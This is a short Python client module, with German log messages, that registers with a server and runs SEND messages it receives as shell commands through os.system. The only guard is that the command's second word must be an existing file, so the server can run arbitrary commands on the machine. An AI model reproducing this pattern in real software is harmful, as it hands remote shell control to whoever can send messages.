# Filename: modules/run.py

import signal
import sys
import threading
import os
import uuid
from modules.client import Client
from modules.message import Message

class Run:
    def __init__(self, args, host, port,client_id):
        signal.signal(signal.SIGINT, self.signal_handler)
        self.server_address = (host, port)
        self.running = True
        self.client_id =client_id
        self.client = Client(host, port, self.client_id)
        self.client.register()
        self.message_thread = threading.Thread(target=self.receive_messages)
        self.message_thread.daemon = True
        self.message_thread.start()

    def signal_handler(self, sig, frame):
        print("Run wird durch Strg+C beendet.")
        self.running = False
        sys.exit(0)

    def handle_message(self, message):
        print("Nachricht erhalten")
        data = Message.deserialize(message)
        print(f"Empfangene Nachricht: {data}")

        if data.message_type == Message.SEND:
            command = data.content
            print(f"Empfangener Befehl: {command}")
            filename = command.split()[1] if len(command.split()) > 1 else None
            if filename and os.path.exists(filename):
                os.system(command)
            else:
                print(f"Datei {filename} existiert nicht.")
        elif data.message_type == Message.RESPONSE:
            print(f"Nachricht: {data.content}")

    def receive_messages(self):
        while self.running:
            try:
                msg_obj = self.client.receive_message()
                if msg_obj:
                    self.handle_message(msg_obj.serialize())
            except Exception as e:
                print(f"Fehler beim Empfangen der Nachricht: {e}")

    def start(self):
        print("Run client started and waiting for commands...")
        self.receive_messages()

#EOF
